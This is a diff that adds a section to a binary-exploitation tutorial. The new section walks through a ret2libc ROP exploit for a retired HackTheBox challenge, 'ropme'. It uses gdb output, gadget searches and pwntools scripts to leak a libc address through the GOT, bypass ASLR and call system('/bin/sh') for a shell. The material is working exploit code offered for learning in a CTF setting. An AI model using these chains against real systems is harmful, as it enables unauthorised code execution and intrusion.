@@ -7,12 +7,13 @@ ROP B1n-3xp
 echo "0" >  /proc/sys/kernel/randomize_va_space
 ```
 ## Contents
-- [Part1 - Basics of Writing a ROP chain](#part1---basics-of-writing-a-rop-chain)
+- [Part1 : Basics of Writing a ROP chain](#part1--basics-of-writing-a-rop-chain)
 	- [86x_32](#x86_32)
 	- [86x_64](#x86_64)
 - [Part2 : Dealing With Bad Chars](#part2--dealing-with-bad-chars)
+- [Part3 : Bypassing ASLR to ROP & Leaking Libc Address in a 64bit Binary](#part3--bypassing-aslr-to-rop--leaking-libc-address-in-a-64bit-binary)
 
-## Part1 - Basics of Writing a ROP chain
+## Part1 : Basics of Writing a ROP chain
 
 # **The Stack Difference Between 32 and 64 bit binary**
 
@@ -493,3 +494,314 @@ End of assembler dump.
 		r.sendline(payload)
 		r.interactive()
 		~~~
+
+## Part3 : Bypassing ASLR to ROP & Leaking Libc Address in a 64bit Binary
+
+### Bypassing ASLR to ROP
+
+- ASLR - Address Space Layout Randomisation ,Its a memory protection process where the entire memory address are randomised by changing the base address every-time the binary executes.
+- If the binary we intend to exploit a binary in the local server , we can easily disable ASLR and exploit the binary. But the problem rises when the binary is running on a remote server where the ASLR is enable and cant be disabled remotely.
+- This is demonstrated by exploiting ropme from HackTheBox(Retired Pwn Challenge) and with ASLR Enabled in my Desktop
+
+**On Running the binary**
+
+```
+ROP me outside, how 'about dah?
+```
+
+**Checking the executable using Checksec**
+
+```
+Arch:     amd64-64-little #x64bit Little Endian
+RELRO:    Partial RELRO 
+Stack:    No canary found
+NX:       NX enabled #We cant use a shellcode to pop a shell by executing directly in the stack
+PIE:      No PIE (0x400000)
+```
+
+- So the binary just expects a input from us and its a x64 bit binary , pretty straight forward. Let us find out if there is some hidden function inside the binary
+
+```gdb
+gef➤  info func
+All defined functions:
+
+Non-debugging symbols:
+0x00000000004004b0  _init
+0x00000000004004e0  puts@plt
+0x00000000004004f0  __libc_start_main@plt
+0x0000000000400500  fgets@plt
+0x0000000000400510  fflush@plt
+0x0000000000400520  __gmon_start__@plt
+0x0000000000400530  _start
+0x0000000000400560  deregister_tm_clones
+0x00000000004005a0  register_tm_clones
+0x00000000004005e0  __do_global_dtors_aux
+0x0000000000400600  frame_dummy
+0x0000000000400626  main
+0x0000000000400670  __libc_csu_init
+0x00000000004006e0  __libc_csu_fini
+0x00000000004006e4  _fini
+```
+
+- Nothing looks suspicious nor interesting , we shall see what’s inside the main function.
+
+```gdb
+gef➤  
+Dump of assembler code for function main:
+   0x0000000000400626 <+0>:     push   rbp
+   0x0000000000400627 <+1>:     mov    rbp,rsp
+   0x000000000040062a <+4>:     sub    rsp,0x50
+   0x000000000040062e <+8>:     mov    DWORD PTR [rbp-0x44],edi
+   0x0000000000400631 <+11>:    mov    QWORD PTR [rbp-0x50],rsi
+   0x0000000000400635 <+15>:    mov    edi,0x4006f8
+   0x000000000040063a <+20>:    call   0x4004e0 <puts@plt>
+   0x000000000040063f <+25>:    mov    rax,QWORD PTR [rip+0x200a0a]        # 0x601050 <stdout@@GLIBC_2.2.5>
+   0x0000000000400646 <+32>:    mov    rdi,rax
+   0x0000000000400649 <+35>:    call   0x400510 <fflush@plt>
+   0x000000000040064e <+40>:    mov    rdx,QWORD PTR [rip+0x200a0b]        # 0x601060 <stdin@@GLIBC_2.2.5>
+   0x0000000000400655 <+47>:    lea    rax,[rbp-0x40]
+   0x0000000000400659 <+51>:    mov    esi,0x1f4
+   0x000000000040065e <+56>:    mov    rdi,rax
+   0x0000000000400661 <+59>:    call   0x400500 <fgets@plt>
+   0x0000000000400666 <+64>:    mov    eax,0x0
+   0x000000000040066b <+69>:    leave  
+   0x000000000040066c <+70>:    ret    
+End of assembler dump.
+```
+
+- The fgets call in the main function creates the buffer overflow vulnerability and the puts address can be used the put the address of desired function addresses we need.
+
+# *Devising a Solution*
+
+1. Finding the offset of the binary , in this case you wont be able to overwrite the RIP (x64bit Instruction Pointer) right away as this is a 64bit binary not a 32bit binary, Here you can overwrite both RBP(x64bit Base Pointer) and RSP(x64bit Stack Pointer)
+
+```gdb
+gef➤  pattern create 200
+[+] Generating a pattern of 200 bytes
+aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa
+gef➤  r
+Starting program: /root/Desktop/ropme 
+ROP me outside, how 'about dah?
+aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa
+
+Program received signal SIGSEGV, Segmentation fault.
+0x000000000040066c in main ()
+[ Legend: Modified register | Code | Heap | Stack | String ]
+───────────────────────────────────────────────────────────────── registers ────
+$rax   : 0x0               
+$rbx   : 0x0               
+$rcx   : 0x0000000000602779  →  0x0000000000000000
+$rdx   : 0x0               
+$rsp   : 0x00007fffffffdec8  →  "jaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapa[...]"
+$rbp   : 0x6161616161616169 ("iaaaaaaa"?)
+$rsi   : 0x0000000000602779  →  0x0000000000000000
+$rdi   : 0x00007ffff7fad680  →  0x0000000000000000
+$rip   : 0x000000000040066c  →  <main+70> ret 
+$r8    : 0x00007fffffffde80  →  "aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga[...]"
+$r9    : 0x6161616161616176 ("vaaaaaaa"?)
+$r10   : 0x6161616161616177 ("waaaaaaa"?)
+$r11   : 0x6161616161616178 ("xaaaaaaa"?)
+$r12   : 0x0000000000400530  →  <_start+0> xor ebp, ebp
+$r13   : 0x0               
+$r14   : 0x0               
+$r15   : 0x0               
+....SNIPPED....
+─────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "ropme", stopped 0x40066c in main (), reason: SIGSEGV
+───────────────────────────────────────────────────────────────────── trace ────
+[#0] 0x40066c → main()
+────────────────────────────────────────────────────────────────────────────────
+gef➤  pattern offset jaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapa #RSP
+[+] Searching 'jaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapa'
+[+] Found at offset 72 (big-endian search) 
+gef➤  pattern offset 0x6161616161616169 #RBP
+[+] Searching '0x6161616161616169'
+[+] Found at offset 64 (little-endian search) likely
+[+] Found at offset 57 (big-endian search)
+```
+
+- As we can see that the RIP is not overwritten , we have found the RSP offset by just copy pasting the value of RSP and finding the offset , we can also find RSP indirectly by finding the RBP offset and then adding 8 to it to find the RSP, `RSP STACK = 8 + RBP STACK`
+
+2. Using ROP and controlling RIP
+
+- The offset is 72. Now our goal is to get a control on RIP.
+    
+- The Usage of ROP is essential in to get a control over RIP because , we are just going to return to RIP from RSP and that’s where the Return Oriented Programming Comes in.
+    
+    - Using Ropper to find the return address
+    
+    ```bash
+    root@kali:~/Desktop# ropper --file ropme --search ret
+    [INFO] Load gadgets from cache
+    [LOAD] loading... 100%
+    [LOAD] removing double gadgets... 100%
+    [INFO] Searching for gadgets: ret
+    
+    [INFO] File: ropme
+    0x000000000040064a: ret 0xfffe; 
+    0x00000000004004c9: ret;
+    ```
+    - The last address looks fine as it just has return without any parameter.
+- Now using creating a payload to control RIP
+    
+
+```python
+from pwn import *
+context.arch = 'amd64' #pwntools configuration for set the architecture
+ret_add = p64(0x00000000004004c9)
+payload = [
+    "A"*72, # offset 
+    ret_add, # Address to return to RIP from RSP
+    p64(0xcafebabe) # A fake RIP address to cause a SEGFAULT and to check if we can successfully control the RIP.
+]
+open("payload",'wb').write("".join(payload))
+```
+
+- Running the binary with the payload
+```gef
+gef➤ r < payload
+Starting program: /root/Desktop/ropme < payload 
+ROP me outside, how 'about dah?
+Program received signal SIGSEGV, Segmentation fault. 0x00000000cafebabe in ?? () \[ Legend: Modified register | Code | Heap | Stack | String \] ───────────────────────────────────────────────────────────────── registers────
+$rax : 0x0
+$rbx : 0x0
+$rcx : 0xfbad20a8
+$rdx : 0x0
+$rsp : 0x00007fffffffded8 → 0x0000000100000000
+$rbp : 0x4141414141414141 (“AAAAAAAA”?)
+$rsi : 0x00000000006026b0 → “AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\[…\]”
+$rdi : 0x00007ffff7fad680 → 0x0000000000000000 
+$rip : 0xcafebabe
+$r8 : 0x00007fffffffde80 → “AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\[…\]”
+$r9 : 0x4141414141414141 (“AAAAAAAA”?)
+$r10 : 0x4141414141414141 (“AAAAAAAA”?)
+$r11 : 0x246
+$r12 : 0x0000000000400530 → &lt;_start+0&gt; xor ebp, ebp
+$r13 : 0x0
+$r14 : 0x0
+$r15 : 0x0
+…SNIPPED… 
+[#0] Id 1, Name: “ropme”, stopped 0xcafebabe in ?? (), reason: SIGSEGV
+```    
+- We have successfully overwritten RIP , Now we can move to the next section where we can find the base address and libc address of system and “/bin/sh” to trigger a shell with ASLR enabled
+    
+
+3. Leaking the Libc Address and finding the Base Address
+
+- Using Put Address from Global Offset Table(GOT) to print the desired function to find the base address. This can be done in 2 ways - Using `POP RDI` and With ROP function from pwntools
+    - Manual Method
+        
+        - Find the `POP RDI; ret` address
+        
+        ```gdb
+        0x00000000004006d3: pop rdi; ret; 
+        ```
+        - GOT address in a binary - We print it’s address and compare it with the local process of the binary to get the base address, It’s a crucial part in bypassing ASLR
+        - PUT Function address in the binary - This is essentials because , we are going to use this to put a desired function’s address as output
+~~~python
+        from pwn import *
+        elf = ELF("./ropme",checksec = False)
+		r = elf.process()
+		print r.recvline().rstrip()
+		pop_rdi = p64(0x00000000004006d3)
+        GOT_func = elf.got['fgets'] # This can be any function like printf , puts , read , fgets ... anything that is available in the binary
+        PUT_func = elf.sym['fgets']
+        print(elf.got) #you can see all available functions in the binary using this!
+        #So we are actually trying to put the fgets address as an output and then compare it with the binary address to find the base address
+		main_func = elf.sym['main']
+		payload = [
+			"A"*72,
+			pop_rdi,
+			GOT_func,
+			PUT_func,
+			main_func
+		]
+		r.sendline("".join(payload))
+		leak = u64(r.recvline().rstrip().ljust(8,"\x00"))
+		# The address of the fgets will be put as output , 
+		print hex(leak)
+		r.close()
+		open("payload",'wb').write("".join(payload))
+~~~
+	- Using ROP function in pwntools
+~~~python
+from pwn import *
+
+elf = ELF("./1",checksec = False)
+r = elf.process()
+print r.recvline().rstrip()
+
+rop = ROP(elf) # Calling ROP function
+context.arch = 'amd64' # If the binary is 64bit , you should always mention the arch to the pwntools so that it works properly
+rop.call(elf.sym['puts'],[elf.got['fgets']]) # Dont forget the square brackets for the second argument in rop.call() function.
+rop.call(elf.sym['main']) # we are using the main as the end address because we chave to complete the whole process in the 1 session, as the base address randomises every session. so we can trigger the main function start the program again without moving to next session.
+
+payload = [
+	"A"*72,
+	rop.chain() # Make a rop chain from the given parameters
+]
+
+r.sendline("".join(payload))
+leak = u64(r.recvline().rstrip().ljust(8,"\x00"))
+print hex(leak)
+r.close()
+open("payload",'wb').write("".join(payload))
+~~~
+- Now that if we run the python program , we will get an output of the leaked address , but its not on Unicode format like the below image
+~~~
+ROP me outside, how 'about dah?
+�%���
+~~~
+- That why I have used rstrip to stip the newline space and ljust to adjust the length of the output to 8 (length of 64 bit address in hex is 8 and for 32bit is 4) and unpacked it with u64() function from pwntools
+- After getting the leaked address, find another leaked address for another available function , For Eg. In this case we found the address of fgets and we also have to find the address of puts or some other address so that its easy to narrow the search for the libc database
+-  Use a libc database to find an appropriate libc for the given binary [Libc Database](https://libc.blukat.me/) using the leaked address(just use the last 3 digits of the leak address , that is more than enough to find the libc)
+![970013cc14984e16a91fa7f550dd186c](https://user-images.githubusercontent.com/66721411/113705723-66c3d580-96fb-11eb-8739-cddcd741a0f0.png)
+
+- Both looks the same , but the last one looks assuring.
+- After downloading the libc , just subtract the leak with the respective function in libc to obtain the base address (Note:Base Address always ends with triple zeros, irrespective of the architecture)
+~~~python
+....SNIPPED....
+libc = ELF("./libc.6.so") # Name of the libc that was downloaded
+libc.address = leak - libc.sym['fgets'] #Here we are using fgets address as the leaked address is fgets , it is only based on your choice and the availibility of the function in the binary
+....SNIPPED.... 
+~~~
+*And i have the base address saved in the variable libc.address becase , pwntools can save the base address if we used the variable libc.address, which will be useful when we are using ROP function from pwntools*
+
+4. Getting the Shell
+- Getting shell can also be done in 2 ways , Both Manually and using ROP function from pwntools
+	- Manual Method
+```python
+from pwn import *
+libc = ELF("./libc.6.so")
+libc_addr = leak - libc.sym['fgets'] # setting the variable of libc_address as the base address, Note: Dont save the variable as libc.address because it interupts the manual method
+pop_rdi = p64(0x00000000004006d3)
+bin_sh = next(libc.search(b"/bin/sh\x00"))
+sys_add = libc.sym['system']
+payload = [
+	"A"*72,
+	pop_rdi,
+	p64(bin_sh+libc_addr),
+	p64(sys_add+libc_addr),
+]
+print r.recvline().rstrip()
+r.sendline("".join(payload))
+r.interactive()
+```
+	- Using ROP function in Pwntools
+```python
+from pwn import *
+libc = ELF("./libc.6.so",checksec=False)
+libc.address = leak - libc.sym['fgets']
+#Note: The variable libc.address should always be declared/intialized between calling elf function for libc and calling rop function for libc , change in this order can prevent you from getting a shell
+print hex(libc.address)
+rop = ROP(libc)
+rop.call(libc.sym['system'],[next(libc.search(b"/bin/sh\x00"))])
+payload = [
+	"A"*72,
+	rop.chain()
+]
+print r.recvline().rstrip()
+r.sendline("".join(payload))
+r.interactive()
+```
+		
